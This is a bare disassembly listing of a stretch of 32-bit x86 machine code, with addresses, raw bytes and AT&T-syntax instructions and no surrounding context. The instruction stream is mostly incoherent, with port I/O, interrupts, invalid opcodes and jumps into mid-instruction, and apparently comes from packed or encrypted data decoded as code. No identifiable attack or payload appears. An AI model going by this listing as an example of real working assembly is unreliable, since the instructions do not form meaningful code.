  4092ba:	88 72 59             	mov    %dh,0x59(%edx)
  4092bd:	5f                   	pop    %edi
  4092be:	9f                   	lahf
  4092bf:	a8 1d                	test   $0x1d,%al
  4092c1:	6d                   	insl   (%dx),%es:(%edi)
  4092c2:	d3 20                	shll   %cl,(%eax)
  4092c4:	fa                   	cli
  4092c5:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4092ca:	89 32                	mov    %esi,(%edx)
  4092cc:	a0 60 a0 48 6d       	mov    0x6d48a060,%al
  4092d1:	f6 9f 5f 2d a5 98    	negb   -0x675ad2a1(%edi)
  4092d7:	48                   	dec    %eax
  4092d8:	3d 06 9f 5f 2d       	cmp    $0x2d5f9f06,%eax
  4092dd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4092de:	94                   	xchg   %eax,%esp
  4092df:	48                   	dec    %eax
  4092e0:	35 06 9f 5f 2b       	xor    $0x2b5f9f06,%eax
  4092e5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4092e6:	9c                   	pushf
  4092e7:	48                   	dec    %eax
  4092e8:	85 18                	test   %ebx,(%eax)
  4092ea:	9f                   	lahf
  4092eb:	5f                   	pop    %edi
  4092ec:	88 14 3b             	mov    %dl,(%ebx,%edi,1)
  4092ef:	5f                   	pop    %edi
  4092f0:	9f                   	lahf
  4092f1:	eb 78                	jmp    0x40936b
  4092f3:	ed                   	in     (%dx),%eax
  4092f4:	ed                   	in     (%dx),%eax
  4092f5:	40                   	inc    %eax
  4092f6:	d3 32                	shll   %cl,(%edx)
  4092f8:	2a 33                	sub    (%ebx),%dh
  4092fa:	2b a5 9c 48 bf 1a    	sub    0x1abf489c(%ebp),%esp
  409300:	9f                   	lahf
  409301:	5f                   	pop    %edi
  409302:	2b a5 80 ed f5 44    	sub    0x44f5ed80(%ebp),%esp
  409308:	88 d8                	mov    %bl,%al
  40930a:	71 5f                	jno    0x40936b
  40930c:	9f                   	lahf
  40930d:	eb e5                	jmp    0x4092f4
  40930f:	44                   	inc    %esp
  409310:	2d b5 98 48 4d       	sub    $0x4d4898b5,%eax
  409315:	31 9f 5f 58 62 a0    	xor    %ebx,-0x5f9da7a1(%edi)
  40931b:	60                   	pusha
  40931c:	a0 48 23 fb 9f       	mov    0x9ffb2348,%al
  409321:	5f                   	pop    %edi
  409322:	2b 38                	sub    (%eax),%edi
  409324:	20 4b a1             	and    %cl,-0x5f(%ebx)
  409327:	d2 a4 d4 b3 4b c0 ed 	shlb   %cl,-0x123fb44d(%esp,%edx,8)
  40932e:	ed                   	in     (%dx),%eax
  40932f:	54                   	push   %esp
  409330:	d3 32                	shll   %cl,(%edx)
  409332:	58                   	pop    %eax
  409333:	cc                   	int3
  409334:	1f                   	pop    %ds
  409335:	a0 a0 48 69 28       	mov    0x286948a0,%al
  40933a:	9f                   	lahf
  40933b:	5f                   	pop    %edi
  40933c:	8b 6f 2d             	mov    0x2d(%edi),%ebp
  40933f:	ad                   	lods   %ds:(%esi),%eax
  409340:	94                   	xchg   %eax,%esp
  409341:	93                   	xchg   %eax,%ebx
  409342:	72 18                	jb     0x40935c
  409344:	2c df                	sub    $0xdf,%al
  409346:	e0 60                	loopne 0x4093a8
  409348:	88 18                	mov    %bl,(%eax)
  40934a:	68 5f 9f ed e5       	push   $0xe5ed9f5f
  40934f:	3c 88                	cmp    $0x88,%al
  409351:	40                   	inc    %eax
  409352:	84 5f 9f             	test   %bl,-0x61(%edi)
  409355:	5f                   	pop    %edi
  409356:	15 3c 9f d5 98       	adc    $0x98d59f3c,%eax
  40935b:	5f                   	pop    %edi
  40935c:	15 54 2d a5 90       	adc    $0x90a52d54,%eax
  409361:	1a a3 60 a0 60 88    	sbb    -0x779f5fa0(%ebx),%ah
  409367:	ae                   	scas   %es:(%edi),%al
  409368:	48                   	dec    %eax
  409369:	5f                   	pop    %edi
  40936a:	9f                   	lahf
  40936b:	eb e5                	jmp    0x409352
  40936d:	50                   	push   %eax
  40936e:	88 02                	mov    %al,(%edx)
  409370:	71 5f                	jno    0x4093d1
  409372:	9f                   	lahf
  409373:	e4 60                	in     $0x60,%al
  409375:	6f                   	outsl  %ds:(%esi),(%dx)
  409376:	25 b9 9f 5f 9f       	and    $0x9f5f9fb9,%eax
  40937b:	eb 66                	jmp    0x4093e3
  40937d:	eb f5                	jmp    0x409374
  40937f:	50                   	push   %eax
  409380:	88 a8 46 5f 9f 93    	mov    %ch,-0x6c60a0ba(%eax)
  409386:	60                   	pusha
  409387:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40938c:	b0 4b                	mov    $0x4b,%al
  40938e:	b2 49                	mov    $0x49,%dl
  409390:	9d                   	popf
  409391:	ff 9f 5f 2b a5 9c    	lcall  *-0x635ad4a1(%edi)
  409397:	48                   	dec    %eax
  409398:	3d fd 9f 5f 88       	cmp    $0x885f9ffd,%eax
  40939d:	08 41 5f             	or     %al,0x5f(%ecx)
  4093a0:	9f                   	lahf
  4093a1:	93                   	xchg   %eax,%ebx
  4093a2:	60                   	pusha
  4093a3:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4093a8:	b0 c8                	mov    $0xc8,%al
  4093aa:	da df                	fcmovu %st(7),%st
  4093ac:	e0 60                	loopne 0x40940e
  4093ae:	2d a5 7c 1a a8       	sub    $0xa81a7ca5,%eax
  4093b3:	60                   	pusha
  4093b4:	a0 60 88 42 45       	mov    0x45428860,%al
  4093b9:	5f                   	pop    %edi
  4093ba:	9f                   	lahf
  4093bb:	23 89 5c 40 5f 9f    	and    -0x60a0bfa4(%ecx),%ecx
  4093c1:	4b                   	dec    %ebx
  4093c2:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  4093c8:	fd                   	std
  4093c9:	23 a0 60 a0 5f 9f    	and    -0x60a05fa0(%eax),%esp
  4093cf:	5f                   	pop    %edi
  4093d0:	9f                   	lahf
  4093d1:	75 a0                	jne    0x409373
  4093d3:	60                   	pusha
  4093d4:	a0 95 19 d3 f6       	mov    0xf6d31995,%al
  4093d9:	d8 e1                	fsub   %st(1),%st
  4093db:	ab                   	stos   %eax,%es:(%edi)
  4093dc:	02 b9 f0 c2 08 b5    	add    -0x4af73d10(%ecx),%bh
  4093e2:	0e                   	push   %cs
  4093e3:	d7                   	xlat   %ds:(%ebx)
  4093e4:	f7 b4 d6 ae 13 b0 a0 	divl   -0x5f4fec52(%esi,%edx,8)
  4093eb:	60                   	pusha
  4093ec:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  4093f1:	76 a0                	jbe    0x409393
  4093f3:	60                   	pusha
  4093f4:	a0 cf 02 b6 ec       	mov    0xecb602cf,%al
  4093f9:	a2 e1 92 e9 cc       	mov    %al,0xcce992e1
  4093fe:	f3 b6 e2             	repz mov $0xe2,%dh
  409401:	a2 d9 8f 12 94       	mov    %al,0x94128fd9
  409406:	e3 ad                	jecxz  0x4093b5
  409408:	d6                   	salc
  409409:	ac                   	lods   %ds:(%esi),%al
  40940a:	ef                   	out    %eax,(%dx)
  40940b:	60                   	pusha
  40940c:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  409411:	77 a0                	ja     0x4093b3
  409413:	60                   	pusha
  409414:	a0 a5 ea a4 0f       	mov    0xfa4eaa5,%al
  409419:	da e3                	(bad)
  40941b:	d8 13                	fcoms  (%ebx)
  40941d:	cb                   	lret
  40941e:	f4                   	hlt
  40941f:	ae                   	scas   %es:(%edi),%al
  409420:	e1 c2                	loope  0x4093e4
  409422:	e9 c2 ea b6 d1       	jmp    0xd1f77ee9
  409427:	92                   	xchg   %eax,%edx
  409428:	06                   	push   %es
  409429:	b9 10 b0 a0 b5       	mov    $0xb5a0b010,%ecx
  40942e:	2b 4c d3 29          	sub    0x29(%ebx,%edx,8),%ecx
  409432:	f1                   	int1
  409433:	b1 f1                	mov    $0xf1,%cl
  409435:	b1 f3                	mov    $0xf3,%cl
  409437:	b6 f7                	mov    $0xf7,%dh
  409439:	93                   	xchg   %eax,%ebx
  40943a:	60                   	pusha
  40943b:	b5 08                	mov    $0x8,%ch
  40943d:	9e                   	sahf
  40943e:	20 a0 a0 c4 9f 90    	and    %ah,-0x6f603b60(%eax)
  409444:	04 e9                	add    $0xe9,%al
  409446:	c0 27 e5             	shlb   $0xe5,(%edi)
  409449:	5c                   	pop    %esp
  40944a:	3a 62 a0             	cmp    -0x60(%edx),%ah
  40944d:	60                   	pusha
  40944e:	d3 20                	shll   %cl,(%eax)
  409450:	f5                   	cmc
  409451:	c8 b9 e0 e0          	enter  $0xe0b9,$0xe0
  409455:	60                   	pusha
  409456:	04 5f                	add    $0x5f,%al
  409458:	d0 c4                	rol    $1,%ah
  40945a:	29 80 2d a5 94 48    	sub    %eax,0x4894a52d(%eax)
  409460:	99                   	cltd
  409461:	46                   	inc    %esi
  409462:	9f                   	lahf
  409463:	5f                   	pop    %edi
  409464:	2b a5 94 48 65 1d    	sub    0x1d654894(%ebp),%esp
  40946a:	9f                   	lahf
  40946b:	5f                   	pop    %edi
  40946c:	2d b5 98 48 1d       	sub    $0x1d4898b5,%eax
  409471:	1e                   	push   %ds
  409472:	9f                   	lahf
  409473:	5f                   	pop    %edi
  409474:	23 dd                	and    %ebp,%ebx
  409476:	98                   	cwtl
  409477:	60                   	pusha
  409478:	14 7e                	adc    $0x7e,%al
  40947a:	2d a5 90 b0 59       	sub    $0x59b090a5,%eax
  40947f:	65 a0 60 a0 93 72    	mov    %gs:0x7293a060,%al
  409485:	eb e5                	jmp    0x40946c
  409487:	58                   	pop    %eax
  409488:	88 20                	mov    %ah,(%eax)
  40948a:	48                   	dec    %eax
  40948b:	5f                   	pop    %edi
  40948c:	9f                   	lahf
  40948d:	eb e5                	jmp    0x409474
  40948f:	50                   	push   %eax
  409490:	88 d0                	mov    %dl,%al
  409492:	5f                   	pop    %edi
  409493:	5f                   	pop    %edi
  409494:	9f                   	lahf
  409495:	e9 e5 5c d3 20       	jmp    0x2113f17f
  40949a:	fa                   	cli
  40949b:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4094a0:	8b 6a 89             	mov    -0x77(%edx),%ebp
  4094a3:	4a                   	dec    %edx
  4094a4:	3e 5f                	ds pop %edi
  4094a6:	9f                   	lahf
  4094a7:	48                   	dec    %eax
  4094a8:	3d 00 9f 5f d3       	cmp    $0xd35f9f00,%eax
  4094ad:	20 fa                	and    %bh,%dl
  4094af:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4094b4:	08 a5 20 a0 a0 ed    	or     %ah,-0x125f5fe0(%ebp)
  4094ba:	e5 50                	in     $0x50,%eax
  4094bc:	5a                   	pop    %edx
  4094bd:	63 a0 60 a0 48 77    	arpl   %esp,0x7748a060(%eax)
  4094c3:	04 9f                	add    $0x9f,%al
  4094c5:	5f                   	pop    %edi
  4094c6:	63 49 91             	arpl   %ecx,-0x6f(%ecx)
  4094c9:	ff 9f 5f 8b 4b 2b    	lcall  *0x2b4b8b5f(%edi)
  4094cf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4094d0:	9c                   	pushf
  4094d1:	bf fe bb 2b 45       	mov    $0x452bbbfe,%edi
  4094d6:	fd                   	std
  4094d7:	23 30                	and    (%eax),%esi
  4094d9:	b3 f6                	mov    $0xf6,%bl
  4094db:	eb 92                	jmp    0x40946f
  4094dd:	eb 78                	jmp    0x409557
  4094df:	48                   	dec    %eax
  4094e0:	e9 5f 9f 5f 2b       	jmp    0x2ba03444
  4094e5:	30 2b                	xor    %ch,(%ebx)
  4094e7:	2e 2b 23             	sub    %cs:(%ebx),%esp
  4094ea:	88 c6                	mov    %al,%dh
  4094ec:	66 5f                	pop    %di
  4094ee:	9f                   	lahf
  4094ef:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  4094f4:	a0 b5 2b 4c 23       	mov    0x234c2bb5,%al
  4094f9:	24 98                	and    $0x98,%al
  4094fb:	b3 f6                	mov    $0xf6,%bl
  4094fd:	b7 d3                	mov    $0xd3,%bh
  4094ff:	20 29                	and    %ch,(%ecx)
  409501:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409502:	98                   	cwtl
  409503:	93                   	xchg   %eax,%ebx
  409504:	60                   	pusha
  409505:	b5 08                	mov    $0x8,%ch
  409507:	53                   	push   %ebx
  409508:	20 a0 a0 c4 9f 90    	and    %ah,-0x6f603b60(%eax)
  40950e:	04 e9                	add    $0xe9,%al
  409510:	c0 26 e5             	shlb   $0xe5,(%esi)
  409513:	5f                   	pop    %edi
  409514:	a0 93 60 b5 08       	mov    0x8b56093,%al
  409519:	33 20                	xor    (%eax),%esp
  40951b:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  409520:	04 e9                	add    $0xe9,%al
  409522:	c0 ed f5             	shr    $0xf5,%ch
  409525:	58                   	pop    %eax
  409526:	58                   	pop    %eax
  409527:	6c                   	insb   (%dx),%es:(%edi)
  409528:	21 a0 a0 48 49 5f    	and    %esp,0x5f4948a0(%eax)
  40952e:	9f                   	lahf
  40952f:	5f                   	pop    %edi
  409530:	2b a5 98 48 59 07    	sub    0x7594898(%ebp),%esp
  409536:	9f                   	lahf
  409537:	5f                   	pop    %edi
  409538:	f0 ca 9f ca          	lock lret $0xca9f
  40953c:	a0 48 07 13 9f       	mov    0x9f130748,%al
  409541:	5f                   	pop    %edi
  409542:	88 42 53             	mov    %al,0x53(%edx)
  409545:	5f                   	pop    %edi
  409546:	9f                   	lahf
  409547:	9d                   	popf
  409548:	57                   	push   %edi
  409549:	60                   	pusha
  40954a:	a0 60 15 64 66       	mov    0x66641560,%al
  40954f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409550:	9f                   	lahf
  409551:	61                   	popa
  409552:	d3 20                	shll   %cl,(%eax)
  409554:	fa                   	cli
  409555:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  40955a:	8b 6a 89             	mov    -0x77(%edx),%ebp
  40955d:	90                   	nop
  40955e:	3e 5f                	ds pop %edi
  409560:	9f                   	lahf
  409561:	48                   	dec    %eax
  409562:	83 ff 9f             	cmp    $0xffffff9f,%edi
  409565:	5f                   	pop    %edi
  409566:	d3 20                	shll   %cl,(%eax)
  409568:	fa                   	cli
  409569:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  40956e:	08 5a 20             	or     %bl,0x20(%edx)
  409571:	a0 a0 ed e5 58       	mov    0x58e5eda0,%al
  409576:	88 5e 43             	mov    %bl,0x43(%esi)
  409579:	5f                   	pop    %edi
  40957a:	9f                   	lahf
  40957b:	23 89 9c 3f 5f 9f    	and    -0x60a0c064(%ecx),%ecx
  409581:	4b                   	dec    %ebx
  409582:	90                   	nop
  409583:	ea e5 5f ff be fb b9 	ljmp   $0xb9fb,$0xbeff5fe5
  40958a:	f9                   	stc
  40958b:	bd 63 5f 9f 5f       	mov    $0x5f9f5f63,%ebp
  409590:	9f                   	lahf
  409591:	7c a0                	jl     0x409533
  409593:	60                   	pusha
  409594:	a0 d3 e9 8b f5       	mov    0xf58be9d3,%al
  409599:	a8 14                	test   $0x14,%al
  40959b:	c2 d6 90             	ret    $0x90d6
  40959e:	d1 d9                	rcr    $1,%ecx
  4095a0:	0c 95                	or     $0x95,%al
  4095a2:	17                   	pop    %ss
  4095a3:	b4 17                	mov    $0x17,%ah
  4095a5:	a9 e7 a7 11 a5       	test   $0xa511a7e7,%eax
  4095aa:	15 c2 14 b9 f5       	adc    $0xf5b914c2,%eax
  4095af:	ac                   	lods   %ds:(%esi),%al
  4095b0:	ef                   	out    %eax,(%dx)
  4095b1:	60                   	pusha
  4095b2:	a0 60 a0 b5 2b       	mov    0x2bb5a060,%al
  4095b7:	4c                   	dec    %esp
  4095b8:	0a 60 0a             	or     0xa(%eax),%ah
  4095bb:	60                   	pusha
  4095bc:	0a 60 f3             	or     -0xd(%eax),%ah
  4095bf:	93                   	xchg   %eax,%ebx
  4095c0:	60                   	pusha
  4095c1:	b5 08                	mov    $0x8,%ch
  4095c3:	ec                   	in     (%dx),%al
  4095c4:	21 a0 a0 c4 9f 90    	and    %esp,-0x6f603b60(%eax)
  4095ca:	04 e9                	add    $0xe9,%al
  4095cc:	c0 ed e5             	shr    $0xe5,%ch
  4095cf:	54                   	push   %esp
  4095d0:	88 54 99 5f          	mov    %dl,0x5f(%ecx,%ebx,4)
  4095d4:	9f                   	lahf
  4095d5:	eb e5                	jmp    0x4095bc
  4095d7:	54                   	push   %esp
  4095d8:	2d b5 98 48 85       	sub    $0x854898b5,%eax
  4095dd:	2e 9f                	cs lahf
  4095df:	5f                   	pop    %edi
  4095e0:	2b a5 98 ed f5 5c    	sub    0x5cf5ed98(%ebp),%esp
  4095e6:	88 ca                	mov    %cl,%dl
  4095e8:	5a                   	pop    %edx
  4095e9:	5f                   	pop    %edi
  4095ea:	9f                   	lahf
  4095eb:	eb f5                	jmp    0x4095e2
  4095ed:	5c                   	pop    %esp
  4095ee:	58                   	pop    %eax
  4095ef:	60                   	pusha
  4095f0:	a0 60 20 48 69       	mov    0x69482060,%al
  4095f5:	3b 9f 5f 2b 38 d3    	cmp    -0x2cc7d4a1(%edi),%ebx
  4095fb:	20 fa                	and    %bh,%dl
  4095fd:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  409602:	08 f3                	or     %dh,%bl
  409604:	21 a0 a0 ed e5 54    	and    %esp,0x54e5eda0(%eax)
  40960a:	5a                   	pop    %edx
  40960b:	63 a0 60 a0 48 29    	arpl   %esp,0x2948a060(%eax)
  409611:	03 9f 5f 63 49 43    	add    0x4349635f(%edi),%ebx
  409617:	fe                   	(bad)
  409618:	9f                   	lahf
  409619:	5f                   	pop    %edi
  40961a:	8b 4b 2b             	mov    0x2b(%ebx),%ecx
  40961d:	23 fb                	and    %ebx,%edi
  40961f:	eb 85                	jmp    0x4095a6
  409621:	bd 63 eb 60 b5       	mov    $0xb560eb63,%ebp
  409626:	2b 4c d3 29          	sub    0x29(%ebx,%edx,8),%ecx
  40962a:	f1                   	int1
  40962b:	b1 f1                	mov    $0xf1,%cl
  40962d:	b1 f1                	mov    $0xf1,%cl
  40962f:	b3 f6                	mov    $0xf6,%bl
  409631:	b7 2b                	mov    $0x2b,%bh
  409633:	38 d3                	cmp    %dl,%bl
  409635:	20 f5                	and    %dh,%ch
  409637:	c8 f0 e2 e0          	enter  $0xe2f0,$0xe0
  40963b:	60                   	pusha
  40963c:	04 5f                	add    $0x5f,%al
  40963e:	d0 c4                	rol    $1,%ah
  409640:	29 80 2b 23 88 00    	sub    %eax,0x88232b(%eax)
  409646:	82 5f 9f 93          	sbbb   $0x93,-0x61(%edi)
  40964a:	60                   	pusha
  40964b:	b5 08                	mov    $0x8,%ch
  40964d:	8b 22                	mov    (%edx),%esp
  40964f:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  409654:	04 e9                	add    $0xe9,%al
  409656:	c0 ed e5             	shr    $0xe5,%ch
  409659:	54                   	push   %esp
  40965a:	88 ca                	mov    %cl,%dl
  40965c:	99                   	cltd
  40965d:	5f                   	pop    %edi
  40965e:	9f                   	lahf
  40965f:	eb e5                	jmp    0x409646
  409661:	54                   	push   %esp
  409662:	2d b5 98 48 0f       	sub    $0xf4898b5,%eax
  409667:	5e                   	pop    %esi
  409668:	9f                   	lahf
  409669:	5f                   	pop    %edi
  40966a:	2b a5 98 ed f5 5c    	sub    0x5cf5ed98(%ebp),%esp
  409670:	88 44 58 5f          	mov    %al,0x5f(%eax,%ebx,2)
  409674:	9f                   	lahf
  409675:	ed                   	in     (%dx),%eax
  409676:	e5 50                	in     $0x50,%eax
  409678:	88 cc                	mov    %cl,%ah
  40967a:	82 5f 9f ed          	sbbb   $0xed,-0x61(%edi)
  40967e:	e5 50                	in     $0x50,%eax
  409680:	f0 ed                	lock in (%dx),%eax
  409682:	e5 4c                	in     $0x4c,%eax
  409684:	f0 19 a6 60 a0 60 5a 	lock sbb %esp,0x5a60a060(%esi)
  40968b:	61                   	popa
  40968c:	a0 60 a0 eb e5       	mov    0xe5eba060,%al
  409691:	5c                   	pop    %esp
  409692:	88 16                	mov    %dl,(%esi)
  409694:	46                   	inc    %esi
  409695:	5f                   	pop    %edi
  409696:	9f                   	lahf
  409697:	eb f5                	jmp    0x40968e
  409699:	4c                   	dec    %esp
  40969a:	f8                   	clc
  40969b:	48                   	dec    %eax
  40969c:	01 04 9f             	add    %eax,(%edi,%ebx,4)
  40969f:	5f                   	pop    %edi
  4096a0:	2b a5 90 eb 73 48    	sub    0x4873eb90(%ebp),%esp
  4096a6:	17                   	pop    %ss
  4096a7:	2f                   	das
  4096a8:	9f                   	lahf
  4096a9:	5f                   	pop    %edi
  4096aa:	d3 20                	shll   %cl,(%eax)
  4096ac:	fa                   	cli
  4096ad:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4096b2:	8b 6a 89             	mov    -0x77(%edx),%ebp
  4096b5:	38 3c 5f             	cmp    %bh,(%edi,%ebx,2)
  4096b8:	9f                   	lahf
  4096b9:	48                   	dec    %eax
  4096ba:	2b fe                	sub    %esi,%edi
  4096bc:	9f                   	lahf
  4096bd:	5f                   	pop    %edi
  4096be:	d3 20                	shll   %cl,(%eax)
  4096c0:	fa                   	cli
  4096c1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4096c6:	08 b7 22 a0 a0 ed    	or     %dh,-0x125f5fde(%edi)
  4096cc:	e5 4c                	in     $0x4c,%eax
  4096ce:	5a                   	pop    %edx
  4096cf:	65 a0 60 a0 48 65    	mov    %gs:0x6548a060,%al
  4096d5:	02 9f 5f 63 49 7f    	add    0x7f49635f(%edi),%bl
  4096db:	fd                   	std
  4096dc:	9f                   	lahf
  4096dd:	5f                   	pop    %edi
  4096de:	8b 4b ff             	mov    -0x1(%ebx),%ecx
  4096e1:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  4096e6:	63 eb                	arpl   %ebp,%ebx
  4096e8:	60                   	pusha
  4096e9:	b5 2b                	mov    $0x2b,%ch
  4096eb:	4c                   	dec    %esp
  4096ec:	59                   	pop    %ecx
  4096ed:	6a a0                	push   $0xffffffa0
  4096ef:	60                   	pusha
  4096f0:	a0 ca a0 ca a0       	mov    0xa0caa0ca,%al
  4096f5:	a9 15 59 f1 b3       	test   $0xb3f15915,%eax
  4096fa:	f6 b7 5e d0 c8 a1    	divb   -0x5e372fa2(%edi)
  409700:	a0 1f 14 88 e1       	mov    0xe188141f,%al
  409705:	60                   	pusha
  409706:	d3 20                	shll   %cl,(%eax)
  409708:	f5                   	cmc
  409709:	c8 df e5 e0          	enter  $0xe5df,$0xe0
  40970d:	60                   	pusha
  40970e:	04 5f                	add    $0x5f,%al
  409710:	d0 c4                	rol    $1,%ah
  409712:	29 80 d3 20 f5 c8    	sub    %eax,-0x370adf2d(%eax)
  409718:	ba e5 e0 60 04       	mov    $0x460e0e5,%edx
  40971d:	5f                   	pop    %edi
  40971e:	d0 c4                	rol    $1,%ah
  409720:	29 80 2d b5 98 93    	sub    %eax,-0x6c674ad3(%eax)
  409726:	60                   	pusha
  409727:	48                   	dec    %eax
  409728:	b5 f2                	mov    $0xf2,%ch
  40972a:	9f                   	lahf
  40972b:	5f                   	pop    %edi
  40972c:	2b a5 98 ed f5 5c    	sub    0x5cf5ed98(%ebp),%esp
  409732:	88 2e                	mov    %ch,(%esi)
  409734:	74 5f                	je     0x409795
  409736:	9f                   	lahf
  409737:	eb f5                	jmp    0x40972e
  409739:	5c                   	pop    %esp
  40973a:	58                   	pop    %eax
  40973b:	c8 c8 a1 a0          	enter  $0xa1c8,$0xa0
  40973f:	48                   	dec    %eax
  409740:	29 02                	sub    %eax,(%edx)
  409742:	9f                   	lahf
  409743:	5f                   	pop    %edi
  409744:	2d ad 94 93 72       	sub    $0x729394ad,%eax
  409749:	18 f8                	sbb    %bh,%al
  40974b:	e5 e0                	in     $0xe0,%eax
  40974d:	60                   	pusha
  40974e:	88 12                	mov    %dl,(%edx)
  409750:	64 5f                	fs pop %edi
  409752:	9f                   	lahf
  409753:	eb e5                	jmp    0x40973a
  409755:	54                   	push   %esp
  409756:	2b 75 08             	sub    0x8(%ebp),%esi
  409759:	88 e1                	mov    %ah,%cl
  40975b:	60                   	pusha
  40975c:	88 d4                	mov    %dl,%ah
  40975e:	46                   	inc    %esi
  40975f:	5f                   	pop    %edi
  409760:	9f                   	lahf
  409761:	03 1c 88             	add    (%eax,%ecx,4),%ebx
  409764:	e1 60                	loope  0x4097c6
  409766:	23 9d 1c 88 e1 60    	and    0x60e1881c(%ebp),%ebx
  40976c:	a0 6f 2e 86 a2       	mov    0xa2862e6f,%al
  409771:	60                   	pusha
  409772:	a0 c8 0c 88 e1       	mov    0xe1880cc8,%al
  409777:	60                   	pusha
  409778:	2d ad 90 18 f8       	sub    $0xf81890ad,%eax
  40977d:	e5 e0                	in     $0xe0,%eax
  40977f:	60                   	pusha
  409780:	d3 32                	shll   %cl,(%edx)
  409782:	88 de                	mov    %bl,%dh
  409784:	64 5f                	fs pop %edi
  409786:	9f                   	lahf
  409787:	eb e5                	jmp    0x40976e
  409789:	50                   	push   %eax
  40978a:	88 ca                	mov    %cl,%dl
  40978c:	43                   	inc    %ebx
  40978d:	5f                   	pop    %edi
  40978e:	9f                   	lahf
  40978f:	eb 70                	jmp    0x409801
  409791:	63 b5 dc c8 a1 a0    	arpl   %esi,-0x5f5e3724(%ebp)
  409797:	19 9f 5f 9f df 41    	sbb    %ebx,0x41df9f5f(%edi)
  40979d:	c8 c8 a1 a0          	enter  $0xa1c8,$0xa0
  4097a1:	48                   	dec    %eax
  4097a2:	47                   	inc    %edi
  4097a3:	05 9f 5f 2d a5       	add    $0xa52d5f9f,%eax
  4097a8:	8c 48 17             	mov    %cs,0x17(%eax)
  4097ab:	5e                   	pop    %esi
  4097ac:	9f                   	lahf
  4097ad:	5f                   	pop    %edi
  4097ae:	2b a5 8c 48 4f 2d    	sub    0x2d4f488c(%ebp),%esp
  4097b4:	9f                   	lahf
  4097b5:	5f                   	pop    %edi
  4097b6:	24 20                	and    $0x20,%al
  4097b8:	15 70 2d a5 88       	adc    $0x88a52d70,%eax
  4097bd:	48                   	dec    %eax
  4097be:	03 5e 9f             	add    -0x61(%esi),%ebx
  4097c1:	5f                   	pop    %edi
  4097c2:	2b a5 88 48 3f ef    	sub    -0x10c0b778(%ebp),%esp
  4097c8:	9f                   	lahf
  4097c9:	5f                   	pop    %edi
  4097ca:	2d b5 80 93 60       	sub    $0x609380b5,%eax
  4097cf:	48                   	dec    %eax
  4097d0:	0d f1 9f 5f 2b       	or     $0x2b5f9ff1,%eax
  4097d5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4097d6:	80 ed f5             	sub    $0xf5,%ch
  4097d9:	44                   	inc    %esp
  4097da:	88 06                	mov    %al,(%esi)
  4097dc:	6c                   	insb   (%dx),%es:(%edi)
  4097dd:	5f                   	pop    %edi
  4097de:	9f                   	lahf
  4097df:	eb e5                	jmp    0x4097c6
  4097e1:	44                   	inc    %esp
  4097e2:	f0 ed                	lock in (%dx),%eax
  4097e4:	e5 3c                	in     $0x3c,%eax
  4097e6:	88 9a 9e 5f 9f eb    	mov    %bl,-0x1460a062(%edx)
  4097ec:	f5                   	cmc
  4097ed:	3c 2b                	cmp    $0x2b,%al
  4097ef:	27                   	daa
  4097f0:	f9                   	stc
  4097f1:	48                   	dec    %eax
  4097f2:	ef                   	out    %eax,(%dx)
  4097f3:	03 9f 5f 8b d9 2b    	add    0x2bd98b5f(%edi),%ebx
  4097f9:	67 88 ea             	addr16 mov %ch,%dl
  4097fc:	6d                   	insl   (%dx),%es:(%edi)
  4097fd:	5f                   	pop    %edi
  4097fe:	9f                   	lahf
  4097ff:	e4 60                	in     $0x60,%al
  409801:	d5 0e                	aad    $0xe
  409803:	93                   	xchg   %eax,%ebx
  409804:	7b ed                	jnp    0x4097f3
  409806:	f5                   	cmc
  409807:	38 58 68             	cmp    %bl,0x68(%eax)
  40980a:	a0 60 a0 48 a7       	mov    0xa748a060,%al
  40980f:	1c 9f                	sbb    $0x9f,%al
  409811:	5f                   	pop    %edi
  409812:	2b a5 78 b0 2d b5    	sub    -0x4ad24f88(%ebp),%esp
  409818:	74 eb                	je     0x409805
  40981a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40981b:	48                   	dec    %eax
  40981c:	25 2b 9f 5f 2b       	and    $0x2b5f9f2b,%eax
  409821:	b5 74                	mov    $0x74,%ch
  409823:	eb 66                	jmp    0x40988b
  409825:	b9 88 7a 43 5f       	mov    $0x5f437a88,%ecx
  40982a:	9f                   	lahf
  40982b:	eb a6                	jmp    0x4097d3
  40982d:	48                   	dec    %eax
  40982e:	d7                   	xlat   %ds:(%ebx)
  40982f:	ef                   	out    %eax,(%dx)
  409830:	9f                   	lahf
  409831:	5f                   	pop    %edi
  409832:	e3 eb                	jecxz  0x40981f
  409834:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409835:	48                   	dec    %eax
  409836:	cb                   	lret
  409837:	2d 9f 5f 24 20       	sub    $0x20245f9f,%eax
  40983c:	15 65 23 5b aa       	adc    $0xaa5b2365,%eax
  409841:	d5 62                	aad    $0x62
  409843:	ed                   	in     (%dx),%eax
  409844:	f5                   	cmc
  409845:	2c d3                	sub    $0xd3,%al
  409847:	20 88 54 30 5f 9f    	and    %cl,-0x60a0cfac(%eax)
  40984d:	eb e5                	jmp    0x409834
  40984f:	2c 2d                	sub    $0x2d,%al
  409851:	b5 70                	mov    $0x70,%ch
  409853:	48                   	dec    %eax
  409854:	cd 2c                	int    $0x2c
  409856:	9f                   	lahf
  409857:	5f                   	pop    %edi
